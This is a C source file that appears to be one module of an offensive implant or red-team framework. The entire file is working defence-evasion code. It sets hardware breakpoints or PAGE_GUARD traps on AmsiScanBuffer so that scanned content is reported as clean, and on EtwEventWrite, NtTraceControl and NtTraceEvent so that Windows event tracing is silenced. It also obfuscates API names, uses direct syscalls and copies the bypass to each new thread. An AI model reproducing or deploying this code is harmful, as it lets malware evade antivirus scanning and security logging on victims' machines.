/**
 * hwbp_bypass.c - Patchless AMSI + ETW bypass via HW breakpoints or PAGE_GUARD
 *
 * Instead of patching function bytes (detectable by memory scanners),
 * we intercept execution via CPU debug registers or PAGE_GUARD + VEH.
 */
#include <windows.h>
#include <string.h>
#include "../../include/config.h"
#include "../../include/obfuscate.h"
#include "../../include/evasion.h"
#include "../../include/syscalls.h"

static PVOID g_amsi_scan_buffer = NULL;
static PVOID g_etw_event_write = NULL;
static PVOID g_nt_trace_control = NULL;
static PVOID g_nt_trace_event = NULL;

static PVOID g_veh_handle = NULL;
static BOOL g_bypass_installed = FALSE;
static int g_bypass_active_method = -1;

volatile BOOL g_hwbp_installed = FALSE;
volatile int g_amsi_bypassed = 0;
volatile int g_etw_bypassed = 0;

DWORD64 g_dr0_value = 0;
DWORD64 g_dr1_value = 0;
DWORD64 g_dr2_value = 0;
DWORD64 g_dr3_value = 0;
DWORD64 g_dr7_value = 0;

typedef struct {
    int in_use;
    void *target_addr;
    const char *purpose;
} DrSlot;

static DrSlot g_dr_slots[4] = {0};
static CRITICAL_SECTION g_dr_lock;
static BOOL g_dr_lock_init = FALSE;

void dr_init(void) {
    if (!g_dr_lock_init) {
        InitializeCriticalSection(&g_dr_lock);
        g_dr_lock_init = TRUE;
    }
}

int dr_allocate(void *target_addr, const char *purpose) {
    int i;

    dr_init();
    EnterCriticalSection(&g_dr_lock);
    for (i = 0; i < 4; i++) {
        if (!g_dr_slots[i].in_use) {
            g_dr_slots[i].in_use = 1;
            g_dr_slots[i].target_addr = target_addr;
            g_dr_slots[i].purpose = purpose;
            LeaveCriticalSection(&g_dr_lock);
            return i;
        }
    }
    LeaveCriticalSection(&g_dr_lock);
    return -1;
}

void dr_release(int slot) {
    if (slot < 0 || slot > 3)
        return;

    dr_init();
    EnterCriticalSection(&g_dr_lock);
    g_dr_slots[slot].in_use = 0;
    g_dr_slots[slot].target_addr = NULL;
    g_dr_slots[slot].purpose = NULL;
    LeaveCriticalSection(&g_dr_lock);
}

int dr_get_slot_for_purpose(const char *purpose) {
    int i;

    if (!purpose)
        return -1;

    dr_init();
    EnterCriticalSection(&g_dr_lock);
    for (i = 0; i < 4; i++) {
        if (g_dr_slots[i].in_use && g_dr_slots[i].purpose &&
            strcmp(g_dr_slots[i].purpose, purpose) == 0) {
            LeaveCriticalSection(&g_dr_lock);
            return i;
        }
    }
    LeaveCriticalSection(&g_dr_lock);
    return -1;
}

static BOOL hwbp_get_thread_context(HANDLE thread, PCONTEXT ctx) {
    if (sys_NtGetContextThread(thread, ctx) == STATUS_SUCCESS)
        return TRUE;
    return GetThreadContext(thread, ctx);
}

static BOOL hwbp_set_thread_context(HANDLE thread, PCONTEXT ctx) {
    if (sys_NtSetContextThread(thread, ctx) == STATUS_SUCCESS)
        return TRUE;
    return SetThreadContext(thread, ctx);
}

static void hwbp_apply_slot(CONTEXT *ctx, int slot, PVOID addr) {
    switch (slot) {
    case 0: ctx->Dr0 = (DWORD64)addr; break;
    case 1: ctx->Dr1 = (DWORD64)addr; break;
    case 2: ctx->Dr2 = (DWORD64)addr; break;
    case 3: ctx->Dr3 = (DWORD64)addr; break;
    default: break;
    }
    ctx->Dr7 |= (1ULL << (slot * 2));
    ctx->Dr7 &= ~(0xFULL << (16 + slot * 4));
}

static void bypass_resolve_targets(void) {
    if (!g_amsi_scan_buffer) {
        HMODULE amsi = LoadLibraryA(OBF("amsi.dll"));
        if (amsi)
            g_amsi_scan_buffer = (PVOID)GetProcAddress(amsi, OBF("AmsiScanBuffer"));
    }

    HMODULE ntdll = GetModuleHandleA(OBF("ntdll.dll"));
    if (ntdll) {
        if (!g_etw_event_write)
            g_etw_event_write = (PVOID)GetProcAddress(ntdll, OBF("EtwEventWrite"));
        if (!g_nt_trace_control)
            g_nt_trace_control = (PVOID)GetProcAddress(ntdll, OBF("NtTraceControl"));
        if (!g_nt_trace_event)
            g_nt_trace_event = (PVOID)GetProcAddress(ntdll, OBF("NtTraceEvent"));
    }
}

static BOOL bypass_has_targets(void) {
    bypass_resolve_targets();
    return g_amsi_scan_buffer || g_etw_event_write ||
           g_nt_trace_control || g_nt_trace_event;
}

static void bypass_spoof_amsi(PCONTEXT ctx) {
    ctx->Rax = 0; /* S_OK */

    /* 6th param (AMSI_RESULT*) at [RSP+0x30] on x64 at function entry */
    DWORD *pResult = *(DWORD **)(ctx->Rsp + 0x30);
    if (pResult) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(pResult, &mbi, sizeof(mbi)) &&
            mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_WRITECOPY |
                            PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
            *pResult = 1; /* AMSI_RESULT_CLEAN */
        }
    }

    ctx->Rip = *(DWORD64 *)ctx->Rsp;
    ctx->Rsp += 8;
}

static void bypass_spoof_etw(PCONTEXT ctx) {
    ctx->Rax = 0;
    ctx->Rip = *(DWORD64 *)ctx->Rsp;
    ctx->Rsp += 8;
}

static BOOL bypass_handle_target(PVOID fault_addr, PCONTEXT ctx) {
    if (fault_addr == g_amsi_scan_buffer) {
        bypass_spoof_amsi(ctx);
        return TRUE;
    }
    if (fault_addr == g_etw_event_write ||
        fault_addr == g_nt_trace_control ||
        fault_addr == g_nt_trace_event) {
        bypass_spoof_etw(ctx);
        return TRUE;
    }
    return FALSE;
}

#if AMSI_BYPASS_METHOD == BYPASS_METHOD_HWBP

static LONG CALLBACK hwbp_exception_handler(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = ep->ContextRecord;
    PVOID fault_addr = (PVOID)ctx->Rip;

    if (bypass_handle_target(fault_addr, ctx)) {
        ctx->Dr6 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL set_hwbp(HANDLE thread, PVOID addr, int slot) {
    CONTEXT ctx;

    if (slot < 0 || slot > 3)
        return FALSE;

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!hwbp_get_thread_context(thread, &ctx))
        return FALSE;

    hwbp_apply_slot(&ctx, slot, addr);
    ctx.Dr6 = 0;

    return hwbp_set_thread_context(thread, &ctx);
}

static BOOL hwbp_install_target(HANDLE thread, PVOID addr, const char *purpose) {
    int slot;

    if (!addr)
        return FALSE;

    slot = dr_get_slot_for_purpose(purpose);
    if (slot < 0)
        slot = dr_allocate(addr, purpose);
    if (slot < 0)
        return FALSE;

    return set_hwbp(thread, addr, slot);
}

static BOOL hwbp_set_breakpoints(HANDLE thread) {
    CONTEXT ctx;
    BOOL any = FALSE;

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!hwbp_get_thread_context(thread, &ctx))
        return FALSE;

    if (g_amsi_scan_buffer) {
        if (hwbp_install_target(thread, g_amsi_scan_buffer, "amsi")) {
            g_amsi_bypassed = 1;
            any = TRUE;
        }
    }
    if (g_etw_event_write) {
        if (hwbp_install_target(thread, g_etw_event_write, "etw")) {
            g_etw_bypassed = 1;
            any = TRUE;
        }
    }
    if (g_nt_trace_control) {
        if (hwbp_install_target(thread, g_nt_trace_control, "nttrace_control"))
            g_etw_bypassed = 1;
    }
    if (g_nt_trace_event) {
        if (hwbp_install_target(thread, g_nt_trace_event, "nttrace_event"))
            g_etw_bypassed = 1;
    }

    if (!any)
        return FALSE;

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (hwbp_get_thread_context(thread, &ctx)) {
        g_dr0_value = ctx.Dr0;
        g_dr1_value = ctx.Dr1;
        g_dr2_value = ctx.Dr2;
        g_dr3_value = ctx.Dr3;
        g_dr7_value = ctx.Dr7;
    }

    return TRUE;
}

static void hwbp_clear_breakpoints(HANDLE thread) {
    CONTEXT ctx;
    int i;

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (hwbp_get_thread_context(thread, &ctx)) {
        ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
        ctx.Dr7 = 0;
        ctx.Dr6 = 0;
        hwbp_set_thread_context(thread, &ctx);
    }

    for (i = 0; i < 4; i++)
        dr_release(i);
}

BOOL hwbp_install_hwbp_amsi(void) {
    bypass_resolve_targets();
    if (!g_amsi_scan_buffer)
        return FALSE;
    if (!hwbp_install_target(GetCurrentThread(), g_amsi_scan_buffer, "amsi"))
        return FALSE;
    g_amsi_bypassed = 1;
    return TRUE;
}

BOOL hwbp_install_hwbp_etw(void) {
    BOOL ok = FALSE;

    bypass_resolve_targets();
    if (g_etw_event_write &&
        hwbp_install_target(GetCurrentThread(), g_etw_event_write, "etw"))
        ok = TRUE;
    if (g_nt_trace_control &&
        hwbp_install_target(GetCurrentThread(), g_nt_trace_control, "nttrace_control"))
        ok = TRUE;
    if (g_nt_trace_event &&
        hwbp_install_target(GetCurrentThread(), g_nt_trace_event, "nttrace_event"))
        ok = TRUE;
    if (ok)
        g_etw_bypassed = 1;
    return ok;
}

BOOL hwbp_install_bypass(void) {
    if (g_bypass_installed && g_bypass_active_method == BYPASS_METHOD_HWBP)
        return TRUE;

    dr_init();

    if (!bypass_has_targets())
        return FALSE;

    if (!g_veh_handle) {
        g_veh_handle = AddVectoredExceptionHandler(1, hwbp_exception_handler);
        if (!g_veh_handle)
            return FALSE;
    }

    if (!hwbp_set_breakpoints(GetCurrentThread()))
        return FALSE;

    g_bypass_installed = TRUE;
    g_bypass_active_method = BYPASS_METHOD_HWBP;
    g_hwbp_installed = TRUE;
    return TRUE;
}

BOOL hwbp_install_on_thread(HANDLE thread) {
    if (!g_bypass_installed || g_bypass_active_method != BYPASS_METHOD_HWBP)
        return FALSE;

    bypass_resolve_targets();
    return hwbp_set_breakpoints(thread);
}

void hwbp_remove_bypass(void) {
    if (g_bypass_active_method == BYPASS_METHOD_HWBP) {
        hwbp_clear_breakpoints(GetCurrentThread());
        g_bypass_installed = FALSE;
        g_bypass_active_method = -1;
        g_hwbp_installed = FALSE;
        g_amsi_bypassed = 0;
        g_etw_bypassed = 0;
        g_dr0_value = 0;
        g_dr1_value = 0;
        g_dr2_value = 0;
        g_dr3_value = 0;
        g_dr7_value = 0;
    }

    if (g_veh_handle) {
        RemoveVectoredExceptionHandler(g_veh_handle);
        g_veh_handle = NULL;
    }
}

BOOL pageguard_install_bypass(void) { return FALSE; }
void pageguard_remove_bypass(void) {}

#elif AMSI_BYPASS_METHOD == BYPASS_METHOD_PAGEGUARD

typedef struct {
    PVOID page_base;
    SIZE_T page_size;
} GUARD_PAGE_ENTRY;

static GUARD_PAGE_ENTRY g_guard_pages[8];
static int g_guard_page_count = 0;

static BOOL pageguard_add_page(PVOID addr) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    PVOID page_base = (PVOID)((ULONG_PTR)addr & ~((ULONG_PTR)si.dwPageSize - 1));
    for (int i = 0; i < g_guard_page_count; i++) {
        if (g_guard_pages[i].page_base == page_base)
            return TRUE;
    }

    if (g_guard_page_count >= (int)(sizeof(g_guard_pages) / sizeof(g_guard_pages[0])))
        return FALSE;

    DWORD old;
    if (!VirtualProtect(page_base, si.dwPageSize, PAGE_EXECUTE_READ | PAGE_GUARD, &old))
        return FALSE;

    g_guard_pages[g_guard_page_count].page_base = page_base;
    g_guard_pages[g_guard_page_count].page_size = si.dwPageSize;
    g_guard_page_count++;
    return TRUE;
}

static void pageguard_rearm_page(PVOID addr) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    PVOID page_base = (PVOID)((ULONG_PTR)addr & ~((ULONG_PTR)si.dwPageSize - 1));
    for (int i = 0; i < g_guard_page_count; i++) {
        if (g_guard_pages[i].page_base == page_base) {
            DWORD old;
            VirtualProtect(page_base, g_guard_pages[i].page_size,
                           PAGE_EXECUTE_READ | PAGE_GUARD, &old);
            return;
        }
    }
}

static LONG CALLBACK pageguard_exception_handler(PEXCEPTION_POINTERS ep) {
    DWORD code = ep->ExceptionRecord->ExceptionCode;
    PCONTEXT ctx = ep->ContextRecord;

    if (code == STATUS_GUARD_PAGE_VIOLATION) {
        PVOID fault_addr = (PVOID)ctx->Rip;
        if (bypass_handle_target(fault_addr, ctx)) {
            pageguard_rearm_page(fault_addr);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }

    if (code == EXCEPTION_SINGLE_STEP) {
        pageguard_rearm_page((PVOID)ctx->Rip);
        ctx->EFlags &= ~0x100;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL pageguard_install_bypass(void) {
    if (g_bypass_installed && g_bypass_active_method == BYPASS_METHOD_PAGEGUARD)
        return TRUE;

    if (!bypass_has_targets())
        return FALSE;

    if (g_amsi_scan_buffer && !pageguard_add_page(g_amsi_scan_buffer))
        return FALSE;
    if (g_etw_event_write && !pageguard_add_page(g_etw_event_write))
        return FALSE;
    if (g_nt_trace_control && !pageguard_add_page(g_nt_trace_control))
        return FALSE;
    if (g_nt_trace_event && !pageguard_add_page(g_nt_trace_event))
        return FALSE;

    if (!g_veh_handle) {
        g_veh_handle = AddVectoredExceptionHandler(1, pageguard_exception_handler);
        if (!g_veh_handle)
            return FALSE;
    }

    g_bypass_installed = TRUE;
    g_bypass_active_method = BYPASS_METHOD_PAGEGUARD;
    if (g_amsi_scan_buffer)
        g_amsi_bypassed = 1;
    if (g_etw_event_write || g_nt_trace_control || g_nt_trace_event)
        g_etw_bypassed = 1;
    return TRUE;
}

void pageguard_remove_bypass(void) {
    if (g_bypass_active_method != BYPASS_METHOD_PAGEGUARD)
        return;

    for (int i = 0; i < g_guard_page_count; i++) {
        DWORD old;
        VirtualProtect(g_guard_pages[i].page_base, g_guard_pages[i].page_size,
                       PAGE_EXECUTE_READ, &old);
    }
    g_guard_page_count = 0;
    g_bypass_installed = FALSE;
    g_bypass_active_method = -1;

    if (g_veh_handle) {
        RemoveVectoredExceptionHandler(g_veh_handle);
        g_veh_handle = NULL;
    }
}

BOOL hwbp_install_bypass(void) { return FALSE; }
BOOL hwbp_install_hwbp_amsi(void) { return FALSE; }
BOOL hwbp_install_hwbp_etw(void) { return FALSE; }
BOOL hwbp_install_on_thread(HANDLE thread) {
    (void)thread;
    return FALSE;
}
void hwbp_remove_bypass(void) {}

#else /* BYPASS_METHOD_PATCH */

BOOL hwbp_install_bypass(void) { return FALSE; }
BOOL hwbp_install_hwbp_amsi(void) { return FALSE; }
BOOL hwbp_install_hwbp_etw(void) { return FALSE; }
BOOL hwbp_install_on_thread(HANDLE thread) {
    (void)thread;
    return FALSE;
}
void hwbp_remove_bypass(void) {}
BOOL pageguard_install_bypass(void) { return FALSE; }
void pageguard_remove_bypass(void) {}

#endif

void hwbp_propagate_to_thread(HANDLE hThread) {
    HANDLE hSelf = NULL;
    CONTEXT src;
    CONTEXT dst;

    if (!g_hwbp_installed || !hThread || hThread == INVALID_HANDLE_VALUE)
        return;

    if (!DuplicateHandle(GetCurrentProcess(), GetCurrentThread(),
                         GetCurrentProcess(), &hSelf, 0, FALSE,
                         DUPLICATE_SAME_ACCESS) || !hSelf)
        return;

    ZeroMemory(&src, sizeof(src));
    src.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (sys_NtGetContextThread(hSelf, &src) != STATUS_SUCCESS) {
        CloseHandle(hSelf);
        return;
    }

    ZeroMemory(&dst, sizeof(dst));
    dst.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    dst.Dr0 = src.Dr0;
    dst.Dr1 = src.Dr1;
    dst.Dr2 = src.Dr2;
    dst.Dr3 = src.Dr3;
    dst.Dr7 = src.Dr7;
    dst.Dr6 = 0;
    sys_NtSetContextThread(hThread, &dst);

    CloseHandle(hSelf);
}

HANDLE jager_create_thread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId)
{
    HANDLE hThread = CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress,
                                  lpParameter, dwCreationFlags, lpThreadId);
    if (hThread)
        hwbp_propagate_to_thread(hThread);
    return hThread;
}

BOOL bypass_install(void) {
#if AMSI_BYPASS_METHOD == BYPASS_METHOD_HWBP
    return hwbp_install_bypass();
#elif AMSI_BYPASS_METHOD == BYPASS_METHOD_PAGEGUARD
    return pageguard_install_bypass();
#else
    return FALSE;
#endif
}

void bypass_remove(void) {
#if AMSI_BYPASS_METHOD == BYPASS_METHOD_HWBP
    hwbp_remove_bypass();
#elif AMSI_BYPASS_METHOD == BYPASS_METHOD_PAGEGUARD
    pageguard_remove_bypass();
#endif
}
